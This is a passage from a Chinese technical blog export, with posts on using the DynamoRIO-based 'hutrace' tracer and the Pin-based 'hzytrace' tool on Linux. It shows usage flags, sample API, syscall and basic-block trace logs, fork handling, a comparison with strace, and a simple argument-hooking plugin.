<li><p>另外对于一些带调试信息的程序，可以根据记录的trace日志情况，编写IDA脚本对其符号信息等进行标注，这里不做展开说明了~自己写的不多，也比较简陋。</p>
</li>
<li><p>对于一些日志中记录的中文等字符串信息，如在hutrace.config中设置char*类型参数打印，需要在010edit中设置简中字符集才能正常显示。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>工具</tag>
        <tag>调试器</tag>
        <tag>dynamorio</tag>
        <tag>hutrace</tag>
        <tag>Windows</tag>
        <tag>漏洞分析</tag>
        <tag>样本分析</tag>
      </tags>
  </entry>
  <entry>
    <title>2022-06-06-hutrace工具系列第3篇之Linux应用</title>
    <url>/2022/06/06/2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC3%E7%AF%87%E4%B9%8BLinux%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=2022-06-06-hutrace工具系列第3篇之Linux应用/图片1.png>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;"></div>
</center>

<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;Linux上常用程序记录工具有strace、ltrace等，能够记录到程序的系统调用以及API函数调用信息，但是均无法得到进一步的调用位置等，hutrace则同时利用dynamorio实现了基本块以及指令状态等的记录，功能与Windows平台保持一致，本文仅对与win有差异的部分进行简单介绍，且Linux平台能公开的样例较少，内容偏少一点。
</blockquote>
<a id="more"></a>

<h2 id="1-基本用法"><a href="#1-基本用法" class="headerlink" title="1. 基本用法"></a>1. 基本用法</h2><p>Linux下的hutrace使用与Windows基本一致：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># huhu @ huhu in ~/Desktop/my/build/bin64 [9:58:27] C:127</span><br><span class="line">$ ./hutrace</span><br><span class="line">ERROR: Usage error: </span><br><span class="line"> Usage:</span><br><span class="line"> -logdir              [     .]  Log directory to print library call data</span><br><span class="line"> -only_from_app       [ false]  Reports only library calls from the app</span><br><span class="line"> -trace_to_librarys   [    &quot;&quot;]  Trace specify librarys</span><br><span class="line"> -record_start_addr   [    &quot;&quot;]  record begin at start_addr</span><br><span class="line"> -record_end_addr     [    &quot;&quot;]  record finished at end_addr</span><br><span class="line"> -follow_children     [ false]  Trace child process</span><br><span class="line"> -print_ret_addr      [ false]  Print library call&apos;s return address</span><br><span class="line"> -print_ins_info      [ false]  Print instructions disassemble info</span><br><span class="line"> -print_ins_reg       [ false]  Print instructions disassemble reg</span><br><span class="line"> -print_ins_all       [ false]  Print instructions trace info</span><br><span class="line"> -print_syscall       [ false]  Print syscall info </span><br><span class="line"> -num_unknown_args    [     2]  Number of unknown libcall args to print</span><br><span class="line"> -num_max_args        [     6]  Maximum number of arguments to print</span><br><span class="line"> -config              [    &quot;&quot;]  The path to custom config file.</span><br><span class="line"> -ignore_underscore   [ false]  Ignores library routine names starting with &quot;_&quot;.</span><br><span class="line"> -only_to_lib         [    &quot;&quot;]  Only reports calls to the library &lt;lib_name&gt;. </span><br><span class="line"> -help                [ false]  Print this message.</span><br><span class="line"> -version             [ false]  Print version number.</span><br><span class="line"> -verbose             [     1]  Change verbosity.</span><br><span class="line"> -use_config          [  true]  Use config file</span><br></pre></td></tr></table></figure>
<p>拿一个最简单的例子来演示，一个比较老的ctf的最简单题，flag解密后直接比较，不过其中夹杂了一些main函数等位置cc断点的检测：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./hutrace -only_from_app -print_ret_addr -print_ins_info -- ./noccbytes</span><br></pre></td></tr></table></figure>

<p>查看trace得到的API记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C7ffff3d8dbb7|7ffff3d8d8a0</span><br><span class="line">7ffff3d8d8a0:</span><br><span class="line">     jmp    &lt;rel&gt; qword ptr [0x00007ffff3f8ef98]</span><br><span class="line">J7ffff3d8d8a0|7ffff6829a50</span><br><span class="line">~~5820~~ libc.so.6!strcpy N:0x42</span><br><span class="line">    arg 1: WattoSays</span><br><span class="line"> (type=char*, size=0x0)</span><br><span class="line"> and return to module id:4, retraddr: 0x7ffff3d8dbbc,offset:0xbbc</span><br><span class="line">7ffff3d8dbbc:</span><br><span class="line">     lea    rdx, [rbp-0x30]</span><br><span class="line">     mov    rax, qword ptr [rbp-0x38]</span><br><span class="line">     mov    rsi, rdx</span><br><span class="line">     mov    rdi, rax</span><br><span class="line">     call   0x00007ffff3d8d8d0</span><br><span class="line"> and strcpy return value:  0x7fffffffda20 </span><br><span class="line">    arg 0: WattoSays</span><br><span class="line"> (type=char*, size=0x0)</span><br><span class="line">C7ffff3d8dbca|7ffff3d8d8d0</span><br><span class="line">7ffff3d8d8d0:</span><br><span class="line">     jmp    &lt;rel&gt; qword ptr [0x00007ffff3f8efb0]</span><br><span class="line">J7ffff3d8d8d0|7ffff68235f0</span><br><span class="line">~~5820~~ libc.so.6!strcmp N:0x43                &lt;----最终解密的password在此比较</span><br><span class="line">    arg 0: 1234567890</span><br><span class="line"> (type=char*, size=0x0)</span><br><span class="line">    arg 1: WattoSays</span><br><span class="line"> (type=char*, size=0x0)</span><br><span class="line"> and return to module id:4, retraddr: 0x7ffff3d8dbcf,offset:0xbcf</span><br><span class="line">7ffff3d8dbcf:</span><br><span class="line">     test   eax, eax</span><br><span class="line">     jnz    0x00007ffff3d8dbda</span><br><span class="line"> and strcmp return value:  0xffffffda </span><br><span class="line">7ffff3d8dbda:</span><br><span class="line">     lea    rdi, &lt;rel&gt; [0x00007ffff3d8de19]</span><br><span class="line">     call   0x00007ffff3d8d8f0</span><br><span class="line">C7ffff3d8dbe1|7ffff3d8d8f0</span><br><span class="line">J7ffff3d8d8f0|7ffff67f36a0</span><br><span class="line">~~5820~~ libc.so.6!puts N:0x44</span><br><span class="line">    arg 0: </span><br><span class="line">Wrong Password (type=char*, size=0x0)</span><br><span class="line"> and return to module id:4, retraddr: 0x7ffff3d8dbe6,offset:0xbe6</span><br></pre></td></tr></table></figure>
<p>当然ltrace也可以做到哦~只是hutrace得到的信息更为丰富。</p>
<h2 id="2-多进程分析"><a href="#2-多进程分析" class="headerlink" title="2. 多进程分析"></a>2. 多进程分析</h2><p>Linux下进程创建方式比较多样，而Fork又有别于常规的进程创建方式，导致hutrace需要额外处理Linux上常见的Fork进程的记录问题，当然处理难度不大，来看下最简单的演示程序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">result = fork();</span><br><span class="line">if(result == -1)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;Fork error\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else if (result == 0)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;The returned value is %d In child process!! My PID is %d\n&quot;,result,getpid());</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;The returned value is %d In father process!! My PID is %d\n&quot;,result,getpid());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开工：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./hutrace -only_from_app -print_ret_addr -print_ins_info -- ./myproctest.out</span><br><span class="line">The returned value is 7774 In father process!! My PID is 7773</span><br><span class="line">The returned value is 0 In child process!! My PID is 7774</span><br></pre></td></tr></table></figure>
<p>我们只看下子进程的记录日志：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC3%E7%AF%87%E4%B9%8BLinux%E5%BA%94%E7%94%A8/%E5%9B%BE%E7%89%872.png" alt=""></p>
<p>常规方式的进程创建没啥特别的，不再说了，可惜Linux上dynamorio不支持Windows上的-syswide_on功能。</p>
<h2 id="3-Linux-Syscall调用记录"><a href="#3-Linux-Syscall调用记录" class="headerlink" title="3. Linux Syscall调用记录"></a>3. Linux Syscall调用记录</h2><p>上一篇中介绍的windows系统调用使用常见相对小众，Linux下就比较常见了，hutrace在linux系统上同样默认不记录syscall调用信息，而且不在hutrace.config中设置参数信息的话只打印系统调用名称，只有设置了参数信息才会打印系统调用的参数，实际使用时和打印API函数以及上一篇Window应用中介绍的使用方式类似，在hutrace.config配置文件中添加对应syscall的参数信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hutrace.config文件中设置：</span><br><span class="line">int|syscall_read|LONG|__out hex^ARG2|int</span><br><span class="line">int|syscall_write|LONG|char *</span><br><span class="line">int|syscall_open|char *|LONG</span><br><span class="line"></span><br><span class="line">运行hutrace记录ls程序运行的syscall：</span><br><span class="line"># huhu @ huhu in ~/Desktop/my/build/bin64 [8:17:52] </span><br><span class="line">$ ./hutrace -only_from_app -print_ret_addr  -print_syscall -- /bin/ls -al</span><br></pre></td></tr></table></figure>
<p>得到的部分日志记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~127677~~ S|syscall_open_2 N:0x4</span><br><span class="line">    arg 0: /etc/ld.so.cache (type=char*, size=0x0)</span><br><span class="line">    arg 1: 0x80000 (type=long, size=0x8)</span><br><span class="line"> and syscall_open return</span><br><span class="line"> S|read0</span><br><span class="line">~~128056~~ S|syscall_read_0 N:0xa</span><br><span class="line">    arg 0: 0x4 (type=long, size=0x8)</span><br><span class="line">    arg 2: 0x340 (type=int, size=0x4)</span><br><span class="line"> and syscall_read return</span><br><span class="line">    arg 1: 0x00007fffffffd3e8</span><br><span class="line">000000: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  .ELF............</span><br><span class="line">000010: 03 00 3e 00 01 00 00 00 b0 5a 00 00 00 00 00 00  ..&gt;......Z......</span><br><span class="line">000020: 40 00 00 00 00 00 00 00 30 f5 01 00 00 00 00 00  @.......0.......</span><br><span class="line">000030: 00 00 00 00 40 00 38 00 08 00 40 00 1e 00 1d 00  ....@.8...@.....</span><br><span class="line">//省略0x340剩余部分显示</span><br><span class="line"> (type=__out hex^ARG2*, size=0x340)</span><br><span class="line">S|write1</span><br><span class="line">~~128056~~ S|syscall_write_1 N:0x3aa</span><br><span class="line">    arg 0: 0x1 (type=long, size=0x8)</span><br><span class="line">    arg 1: drwxrwxr-x 5 huhu huhu    4096 Apr 25 08:11 ..</span><br><span class="line"> (type=char*, size=0x0)</span><br><span class="line"> and syscall_write return</span><br></pre></td></tr></table></figure>
<p>仅这一部分可打印16进制数据的功能就比strace打印的更友好点了~而且strace本身基于ptrace实现的，遇到基于ptrace实现的一些反调试技术就无法继续追踪了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ strace ./myptrace-simple.out</span><br><span class="line">//部分结果</span><br><span class="line">ptrace(PTRACE_TRACEME)                  = -1 EPERM (Operation not permitted)</span><br><span class="line">fstat(1, &#123;st_mode=S_IFCHR|0660, st_rdev=makedev(4, 1), ...&#125;) = 0</span><br><span class="line">ioctl(1, TCGETS, &#123;B38400 opost isig icanon echo ...&#125;) = 0</span><br><span class="line">brk(NULL)                               = 0x8402000</span><br><span class="line">brk(0x8423000)                          = 0x8423000</span><br><span class="line">write(1, &quot;don&apos;t trace me\n&quot;, 15don&apos;t trace me                  &lt;-----ptrace检测</span><br><span class="line">)        = 15</span><br><span class="line">exit_group(1)                           = ?</span><br><span class="line">+++ exited with 1 +++</span><br></pre></td></tr></table></figure>
<p>对比hutrace的结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./hutrace -only_from_app -print_ret_addr -print_ins_info -print_syscall -- ./myptrace-simple.out</span><br><span class="line">no one trace me</span><br><span class="line"></span><br><span class="line">//部分trace结果</span><br><span class="line">~~12192~~ libc.so.6!ptrace N:0x1a</span><br><span class="line">    arg 0: 0x0000000000000000</span><br><span class="line">    arg 1: 0x0000000000000000</span><br><span class="line"> and return to module id:4, retraddr: 0x7ffff3d8e6ac,offset:0x6ac</span><br><span class="line">S|ptrace101</span><br><span class="line">~~12192~~ S|syscall_ptrace_101 N:0x1b</span><br><span class="line"> and syscall_ptrace return</span><br><span class="line">7ffff3d8e6ac:</span><br><span class="line">     cmp    rax, 0xff</span><br><span class="line">     jnz    0x00007ffff3d8e6c5</span><br><span class="line"> and ptrace return value:  0x0                           &lt;-----ptrace未检测到</span><br><span class="line">7ffff3d8e6c5:</span><br><span class="line">     lea    rdi, &lt;rel&gt; [0x00007ffff3d8e773]</span><br><span class="line">     call   0x00007ffff3d8e550</span><br><span class="line">C7ffff3d8e6cc|7ffff3d8e550</span><br><span class="line">7ffff3d8e550:</span><br><span class="line">     jmp    &lt;rel&gt; qword ptr [0x00007ffff3f8efc8]</span><br><span class="line">J7ffff3d8e550|7ffff6b756a0</span><br><span class="line">~~12192~~ libc.so.6!puts N:0x1c</span><br><span class="line">    arg 0: no one trace me (type=char*, size=0x0)</span><br><span class="line"> and return to module id:4, retraddr: 0x7ffff3d8e6d1,offset:0x6d1</span><br></pre></td></tr></table></figure>
<p>不过目前还是存在一些基于ptrace的反调试技术如debugblocker等可能导致hutrace追踪失败的，可以只使用hutrace追踪父进程，提取其处理流程对程序进行patch等，后面如果有想到好点的解决方案也会添加进去。</p>
<h2 id="4-Linux系统下任意地址hook插件编写"><a href="#4-Linux系统下任意地址hook插件编写" class="headerlink" title="4. Linux系统下任意地址hook插件编写"></a>4. Linux系统下任意地址hook插件编写</h2><p>Linux系统上相比Window上利用hutrace加载自定义插件的限制更大，无法像Win上方便的利用GetModuleHandle获取除kernel32.dll、kernerbase.dll模块外其它模块的基址（上一篇提到过，当然dynamorio自己也有接口），虽然还有其它方法可以实现，但是目前想到的代价略微有点大，暂时也没有需求，后面如果有好的实现方法会更新下，暂时只支持固定地址方式进行Hook（不支持windows平台上hutrace插件的模块名+偏移的方式），下面来看一个演示例子，在hutrace.config中添加下述配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hook|null|0x400706|mylinuxplugin.so|f_hookpre|f_hookpost</span><br><span class="line">//和windows系统上的设置一样，如果hook的地址对应的并非一个函数，或者不需要对其函数返回状态进行hook，可以设置f_hookpost为null，否则可能会导致程序崩溃</span><br></pre></td></tr></table></figure>
<p>目标程序0x400706为一个简单的打印参数函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// test_arg(1,2,3,4,5,6,7,8);</span><br><span class="line">__int64 __fastcall test_arg(unsigned int a1, unsigned int a2, unsigned int a3, unsigned int a4, unsigned int a5, unsigned int a6, unsigned int a7, unsigned int a8)</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;a1:%d\n&quot;, a1);</span><br><span class="line">  printf(&quot;a2:%d\n&quot;, a2);</span><br><span class="line">  printf(&quot;a3:%d\n&quot;, a3);</span><br><span class="line">  printf(&quot;a4:%d\n&quot;, a4);</span><br><span class="line">  printf(&quot;a5:%d\n&quot;, a5);</span><br><span class="line">  printf(&quot;a6:%d\n&quot;, a6);</span><br><span class="line">  printf(&quot;a7:%d\n&quot;, a7);</span><br><span class="line">  printf(&quot;a8:%d\n&quot;, a8);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应的Hook函数实现（my_fprintf函数指针由hutrace插件自动赋值，不用考虑其实现），通过hook方式将所有的参数设置为1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg_t f_hookpre(file_t outf, dr_mcontext_t *mc, reg_t ret_addr)</span><br><span class="line">&#123;</span><br><span class="line">   for (reg_t i = 1; i &lt;= 8; i++)</span><br><span class="line">   &#123;</span><br><span class="line">      my_fprintf(outf, &quot;[hook]:get arg_%d: &quot;PIFMT&quot; \n&quot;, i,my_getarg(mc, i));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   //调用write函数也可以写入记录到trace日志文件，效果和my_fprintf一致</span><br><span class="line">   write(outf, &quot;[hook]modify arg...\n&quot;, strlen(&quot;[hook]modify arg...\n&quot;));</span><br><span class="line"></span><br><span class="line">   for (reg_t i = 1; i &lt;= 8; i++)</span><br><span class="line">   &#123;</span><br><span class="line">      my_fprintf(outf, &quot;[hook]:set arg_%d\n&quot;, i);</span><br><span class="line">      my_setarg(mc, i, 1);</span><br><span class="line">   &#125;</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样可以不依赖my_getarg、my_setarg等插件模板中已经实现好的函数对寄存器等进行修改（利用mc参数）~</p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>Windows上的调试分析工具很多且均比较完善了，Linux上gdb调试一些多进程程序都稍微麻烦点，另外稍微特殊的程序如利用错误section头部反调试的，虽然也可以gdb附加，但是使用hutrace来搞都没啥问题，特殊情况下hutrace无法运行的程序就要靠接下来介绍的hzytrace了，详见下一页基于pin实现的hzytrace具体介绍。</p>
]]></content>
      <tags>
        <tag>工具</tag>
        <tag>调试器</tag>
        <tag>dynamorio</tag>
        <tag>hutrace</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>2022-06-06-hutrace工具系列第4篇之衍生工具hzytrace</title>
    <url>/2022/06/06/2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC4%E7%AF%87%E4%B9%8B%E8%A1%8D%E7%94%9F%E5%B7%A5%E5%85%B7hzytrace/</url>
    <content><![CDATA[<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=2022-06-06-hutrace工具系列第4篇之衍生工具hzytrace/图片1.png>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;"></div>
</center>

<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;hutrace的功能已经实现的比较全面了，dynamroio与pin虽然在对程序的分析处理上各有一定的优势，但是实际中测试下来dynamorio在Linux下的兼容性要比pin稍微差一点，存在一些无法用hutrace记录但pin可以追踪的情况，而且pin提供的接口功能也更丰富，故基于pin完成了大部分hutrace的功能，也即是下面要介绍的hzytrace工具。hzytrace目前仅支持linux平台，windows平台上基于dynamrio的hutrace在效率、兼容性上均优于pin，暂时就还没完善window下的hzytrace。
</blockquote>
<a id="more"></a>

<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>hzytrace本身基于pin+codapintracer开发，原codapintracer仅支持Windows平台的API记录（类似drltrace），代码基于Window做了特别多的处理（所以hzytrace移植到win上比较简单…），功能也很多，导致移植到linux多了很多坑，而且在linux下pin的对程序的处理接口也存在一些问题，最终魔改完的代码快没法看了。。不过整体来说hzytrace的功能性还可以，可作为hutrace在处理一些Linux程序上的补充，本篇先介绍下hzytrace的基本功能，最后将结合一些实例进行演示。</p>
<h2 id="2-基本功能"><a href="#2-基本功能" class="headerlink" title="2. 基本功能"></a>2. 基本功能</h2><p>hzytrace支持的基本功能参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-bbllog     [default true]      打印所有执行基本块的汇编指令</span><br><span class="line">-forklog    [default true]      默认追踪fork的子进程</span><br><span class="line">-syscall    [default true]      默认追踪进程的syscall调用</span><br><span class="line">-inslog     [default false]     打印所有执行指令的运行状态信息</span><br><span class="line">-logstart   [default false]     指定记录的指令开始地址</span><br><span class="line">-logend     [default false]     指定记录的指令结束地址</span><br><span class="line">-target     [default -]         指定需要记录的模块名</span><br><span class="line">-allimage   [default false]     记录所有模块的运行</span><br></pre></td></tr></table></figure>
<p>默认情况下，hzytrace会记录程序的API调用、Syscall调用以及所有的基本块转移记录，下面结合一些实例的记录信息进行介绍。</p>
<h3 id="2-1-基本块汇编指令打印"><a href="#2-1-基本块汇编指令打印" class="headerlink" title="2.1 基本块汇编指令打印"></a>2.1 基本块汇编指令打印</h3><p>在hzytrace目录中执行下述指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># huhu @ huhu in ~/Desktop/pin-3.5 [3:12:07] </span><br><span class="line">$ ./pin -t hzytrace.so -bbllog  -- ls -al </span><br><span class="line">[INFO] Configuring Pintool</span><br><span class="line">[INFO] Starting instrumented program</span><br><span class="line"></span><br><span class="line">Load Image:/bin/ls Base:400000-41da63</span><br><span class="line">setMainIMGAddress:400000 41da63</span><br><span class="line">Load Image:/lib64/ld-linux-x86-64.so.2 Base:7f8438bd4000-7f8438bf93af</span><br><span class="line">Load Image:[vdso] Base:7ffdde88b000-7ffdde88c02a</span><br><span class="line">[INFO] Opening file</span><br><span class="line">./Results/2022_05_21_03_07_08//TRACER/hzytrace.ls.11596.0.1653120428.out</span><br><span class="line">Load Image:/lib/x86_64-linux-gnu/libselinux.so.1 Base:7f84252b9000-7f84254da6df</span><br><span class="line">Load Image:/lib/x86_64-linux-gnu/libc.so.6 Base:7f8424ec2000-7f842528b99f</span><br><span class="line">Load Image:/lib/x86_64-linux-gnu/libpcre.so.3 Base:7f8424c4b000-7f8424eba107</span><br><span class="line">Load Image:/lib/x86_64-linux-gnu/libdl.so.2 Base:7f8424a2f000-7f8424c320ef</span><br><span class="line">Load Image:/lib/x86_64-linux-gnu/libpthread.so.0 Base:7f8424811000-7f8424a2d427</span><br><span class="line">Load Image:/lib/x86_64-linux-gnu/libnss_compat.so.2 Base:7f8423474000-7f842367c45f</span><br><span class="line">Load Image:/lib/x86_64-linux-gnu/libnsl.so.1 Base:7f8423256000-7f842346ea57</span><br><span class="line">Load Image:/lib/x86_64-linux-gnu/libnss_nis.so.2 Base:7f8422f82000-7f842318d587</span><br><span class="line">Load Image:/lib/x86_64-linux-gnu/libnss_files.so.2 Base:7f8422d6b000-7f8422f7c717</span><br><span class="line"></span><br><span class="line">//以上为hzytrace打印的调试信息</span><br><span class="line"></span><br><span class="line">total 6228</span><br><span class="line">drwxr-x---  4 huhu huhu    4096 May 21 03:07 .</span><br><span class="line">drwxr-x--- 48 huhu huhu    4096 May 21 02:50 ..</span><br><span class="line">//省略部分ls结果显示</span><br></pre></td></tr></table></figure>

<p>查看Results目录下记录的trace日志内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C0x4049c4|0x402640                      </span><br><span class="line"></span><br><span class="line">//C0x4049c4对应下面ida中ls程序反汇编结果</span><br><span class="line">//.text:00000000004049AF mov     r8, offset fini ; fini</span><br><span class="line">//.text:00000000004049B6 mov     rcx, offset init ; init</span><br><span class="line">//.text:00000000004049BD mov     rdi, offset main ; main</span><br><span class="line">//.text:00000000004049C4 call    ___libc_start_main</span><br><span class="line"></span><br><span class="line">B0x402640|0x402640</span><br><span class="line">	D0x402640|jmp qword ptr [rip+0x21bb7a]</span><br><span class="line">B0x402646|0x40264b</span><br><span class="line">	D0x402646|push 0x35</span><br><span class="line">	D0x40264b|jmp 0x4022e0</span><br><span class="line">B0x4022e0|0x4022e6</span><br><span class="line">	D0x4022e0|push qword ptr [rip+0x21bd22]</span><br><span class="line">	D0x4022e6|jmp qword ptr [rip+0x21bd24]</span><br><span class="line">J0x4022e6|0x7f15489d0f10</span><br><span class="line"></span><br><span class="line">//hzytrace_linux.config未配置的函数默认打印四个参数</span><br><span class="line">~~16451~~ libc.so.6!__libc_start_main N:0x1</span><br><span class="line">	arg 0: 0x402a00</span><br><span class="line">	arg 1: 0x2</span><br><span class="line">	arg 2: 0x7ffda586d668</span><br><span class="line">	arg 3: 0x413bb0</span><br><span class="line"></span><br><span class="line">//ls的init</span><br><span class="line">B0x413bb0|0x413bdc                  </span><br><span class="line">	D0x413bb0|push r15</span><br><span class="line">	D0x413bb2|push r14</span><br><span class="line">	D0x413bb4|mov r15d, edi</span><br><span class="line">	D0x413bb7|push r13</span><br><span class="line">	D0x413bb9|push r12</span><br><span class="line">	D0x413bbb|lea r12, ptr [rip+0x20a23e]</span><br><span class="line">	D0x413bc2|push rbp</span><br><span class="line">	D0x413bc3|lea rbp, ptr [rip+0x20a23e]</span><br><span class="line">	D0x413bca|push rbx</span><br><span class="line">	D0x413bcb|mov r14, rsi</span><br><span class="line">	D0x413bce|mov r13, rdx</span><br><span class="line">	D0x413bd1|sub rbp, r12</span><br><span class="line">	D0x413bd4|sub rsp, 0x8</span><br><span class="line">	D0x413bd8|sar rbp, 0x3</span><br><span class="line">	D0x413bdc|call 0x4022b8</span><br><span class="line">C0x413bdc|0x4022b8</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">//hzytrace_linux.config配置的函数根据设置的参数类型的打印参数信息</span><br><span class="line">~~16451~~ libc.so.6!__lxstat N:0x25b</span><br><span class="line">	arg 0: 0x1</span><br><span class="line">	arg 1: 0x7ffda586ce00</span><br><span class="line">	arg 2: 0x246d3e0</span><br><span class="line">	arg 3: 0x2</span><br><span class="line">~~16451~~ libc.so.6!__lxstat64 N:0x25c</span><br><span class="line"> 	arg 0: 0x1 (type=int, size=0x4)</span><br><span class="line"> 	arg 1: pintool.log (type=char*, size=0x0)</span><br><span class="line"> 	arg 2:  (type=char*, size=0x0)</span><br><span class="line">S|lstat:6</span><br><span class="line">   executed libc.so.6!__lxstat returnIp:0x4080c9 =&gt;</span><br><span class="line">	retval: 0x0</span><br><span class="line">   executed libc.so.6!__lxstat64 returnIp:0x4080c9 =&gt;</span><br><span class="line"> 	retval: 0x0 (type=int, size=0x4)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>显示功能基本与hutrace保持一致，同时支持hex以及struct打印，除后面介绍的hook、dump功能上（不支持hutrace的简易patch、hide功能），hzytrace_linux.config与hutrace.config在API参数打印上的设置基本一致。</p>
<p>如果不需要打印基本块对应的汇编指令，可以设置bbllog参数的值为false：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./pin -t hzytrace.so -bbllog  0 -- ls -al</span><br></pre></td></tr></table></figure>
<p>trace结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C0x4049c4|0x402640</span><br><span class="line">J0x4022e6|0x7f93f9a77f10</span><br><span class="line">~~16821~~ libc.so.6!__libc_start_main N:0x1</span><br><span class="line">	arg 0: 0x402a00</span><br><span class="line">	arg 1: 0x2</span><br><span class="line">	arg 2: 0x7ffda07a5b88</span><br><span class="line">	arg 3: 0x413bb0</span><br><span class="line">C0x413bdc|0x4022b8</span><br><span class="line">R0x4022d1|0x413be1</span><br><span class="line">C0x413bf9|0x404a70</span><br><span class="line">R0x404a49|0x413bfd</span><br><span class="line">R0x413c14|0x7f93e5d6e7cf</span><br></pre></td></tr></table></figure>
<p>注意开启bbllog的trace日志中会打印出所有ls主程序中执行的代码，而在上述不开启bbllog的trace日志结果中，并不会记录到跳转到main函数0x402A00地址的信息，因为并非是从ls主程序中执行的指令跳转进入的main函数。</p>
<ul>
<li>一个小bug：在ls等程序运行加载libc.so.6进行初始化时，pin无法获取到初始化代码的模块名称，而hzytrace记录时会默认记录不在任意模块内的代码，导致trace日志开头会存在一小部分libc.so代码的冗余，后面的trace日志中不会再出现该情况。</li>
</ul>
<h3 id="2-2-syscall记录"><a href="#2-2-syscall记录" class="headerlink" title="2.2 syscall记录"></a>2.2 syscall记录</h3><p>功能及使用方式与hutrace类似，默认情况下只打印执行的syscall的名称，在hzytrace_linux.config文件中设置参数信息后才会根据参数类型打印对应的参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int|syscall_read|LONG|__out hex^ARG2|int</span><br><span class="line">int|syscall_write|LONG|char *</span><br><span class="line">int|syscall_open|char *|LONG</span><br></pre></td></tr></table></figure>

<p>trace记录样例(运行过程中所有syscall)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./pin -t hzytrace.so -syscall -- ls -al</span><br></pre></td></tr></table></figure>

<p>分析trace的结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">S|brk:12</span><br><span class="line">S|access:21</span><br><span class="line">S|access:21</span><br><span class="line">S|open:2</span><br><span class="line">SysEnter|syscall_open|0x7f5ec45d41d1|0x80000|</span><br><span class="line"> 	arg 0: /etc/ld.so.cache (type=char*, size=0x0)</span><br><span class="line"> 	arg 1: 0x80000 (type=long, size=0x8)</span><br><span class="line">SysExit|open</span><br><span class="line">S|fstat:5</span><br><span class="line">S|mmap:9</span><br><span class="line">S|close:3</span><br><span class="line">S|access:21</span><br><span class="line">S|open:2</span><br><span class="line">SysEnter|syscall_open|0x7f5ec47dbd60|0x80000|</span><br><span class="line"> 	arg 0: /lib/x86_64-linux-gnu/libselinux.so.1 (type=char*, size=0x0)</span><br><span class="line"> 	arg 1: 0x80000 (type=long, size=0x8)</span><br><span class="line">SysExit|open</span><br><span class="line">S|read:0</span><br><span class="line">SysEnter|syscall_read|0x3|0x7ffda586ce38|0x340|</span><br><span class="line"> 	arg 0: 0x3 (type=long, size=0x8)</span><br><span class="line"> 	arg 2: 0x340 (type=int, size=0x4)</span><br><span class="line">SysExit|read</span><br><span class="line"> 	arg 1: 0x7ffda586ce38</span><br><span class="line">000000: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  .ELF............</span><br><span class="line">000010: 03 00 3e 00 01 00 00 00 b0 5a 00 00 00 00 00 00  ..&gt;......Z......</span><br><span class="line">000020: 40 00 00 00 00 00 00 00 30 f5 01 00 00 00 00 00  @.......0.......</span><br><span class="line">000030: 00 00 00 00 40 00 38 00 08 00 40 00 1e 00 1d 00  ....@.8...@.....</span><br><span class="line">000040: 01 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>如果不需要记录syscall调用，同样设置syscall参数为0即可：</p>
